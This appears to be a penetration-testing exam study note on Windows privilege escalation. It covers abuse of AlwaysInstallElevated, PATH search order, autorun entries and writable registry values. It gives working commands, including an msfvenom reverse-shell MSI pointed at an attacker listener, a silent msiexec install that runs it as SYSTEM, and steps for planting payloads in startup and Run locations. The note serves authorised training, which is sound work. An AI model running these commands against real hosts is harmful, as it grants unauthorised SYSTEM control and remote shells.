One test unifies this whole note - "what higher-privileged process reads, loads, or executes this writable object?" No privileged consumer means no escalation, no matter how writable the object is.

## Goal
Find a writable object (file, directory, PATH entry, autorun, registry value) that a more-privileged process consumes - then feed it your payload.

## Tips
Writable is a precondition, never a conclusion. Two ACL scopes differ: control of a **file** versus control of its **parent directory** (directory write lets you replace / plant files even when the file itself is protected). `HKLM` ≈ machine-wide config (`/etc`); `HKCU` ≈ per-user config (dotfiles).

Checklist:
- [ ] a writable dir sits EARLY in a privileged process's search path (and it calls a binary by name)?
- [ ] an autorun / startup item a more-privileged user will trigger?
- [ ] a registry value a privileged component reads?
- [ ] `AlwaysInstallElevated` = 1 in BOTH HKLM and HKCU?

# Commands

### Step 1: read ACLs
```batch
icacls "C:\path\to\object"                     :: file / dir perms (F/M/W = you can write)
accesschk.exe /accepteula -uwdqs Users C:\     :: directories Users can write
accesschk.exe /accepteula -uwqs  Users C:\*.*  :: files Users can write
```

### Step 2: AlwaysInstallElevated (both hives)
```batch
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Exploit

### Case 1: AlwaysInstallElevated
**Precondition:** BOTH keys above return `0x1`. Either one missing / `0x0` = not exploitable.
**Abuse:** build an MSI payload, install it (runs as SYSTEM).
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f msi -o evil.msi
```
```batch
msiexec /quiet /qn /i C:\Users\Public\evil.msi
```
(transfer the MSI → [[01_orientation#File transfer - Kali to Windows|file transfer]])
**Verify:** catch your shell, then `whoami`.
**Dead end / pivot:** only one hive set → dead. You check *your own* HKCU, so a missing HKCU value is final for you.

### Case 2: PATH / search-order hijack
**Preconditions (all):** a privileged process calls a binary **by name** (not a full path) + a directory you can write sits **earlier** in that process's actual search path + you can trigger the process.
**Check:**
```batch
echo %PATH%            :: is a writable dir listed before the real binary's dir?
icacls "C:\that\dir"   :: confirm you can write it
```
**Abuse:** plant `name.exe` (your payload) in the writable earlier directory; trigger the privileged process.
**Dead end / pivot:** the process calls by full path, or no writable dir precedes it → not exploitable. Do not assume any writable PATH dir is a win - prove the privileged by-name invocation first.

### Case 3: Autorun / startup items
**Precondition:** the entry runs when a **more-privileged** user logs on or the machine reboots, and you can write the target.
**Check:**
```batch
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
Enumerate autostart locations with [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns).
**Abuse:** drop your payload into the writable startup dir, or repoint a writable `Run` value; wait for an admin logon or reboot.
**Dead end / pivot:** only your own user triggers it → no gain.

### Case 4: Weak (non-service) registry value
**Precondition:** a privileged component reads a registry value you can write (service `ImagePath` is covered in [[03_services]] Case 4).
**Abuse:** set the value to your payload / path; trigger the consumer.
**Dead end / pivot:** value not consumed by anything privileged → inert.

## Correcting common misconceptions
- "Writable = privesc" is **false** - a writable object matters only if a more-privileged process reads / loads / executes it.
- Not every writable directory in `%PATH%` is exploitable - you must prove the privileged **by-name** invocation and the search-order precedence.
- AlwaysInstallElevated needs **both** HKLM and HKCU set to `1`. You check your own HKCU; a missing one is final for you.

Keep payloads exam-scope: prefer an msfvenom `.exe` / `.msi` (unlimited use) over Meterpreter-heavy chains.

[LOLBAS](https://lolbas-project.github.io/) - a trusted built-in binary for execution / download inside a hijack. [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) - effective write access. [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) - enumerate autostart entries.

## Helpline:
1. File vs directory control
```
write the FILE -> replace its contents
write the DIR  -> plant / replace files inside (even ones you can't write directly),
                 unless perms / ownership block it
```

2. AlwaysInstallElevated
```
HKLM\...\Installer AlwaysInstallElevated = 0x1   AND
HKCU\...\Installer AlwaysInstallElevated = 0x1   -> msiexec /i evil.msi runs as SYSTEM
either missing / 0x0 -> dead
```
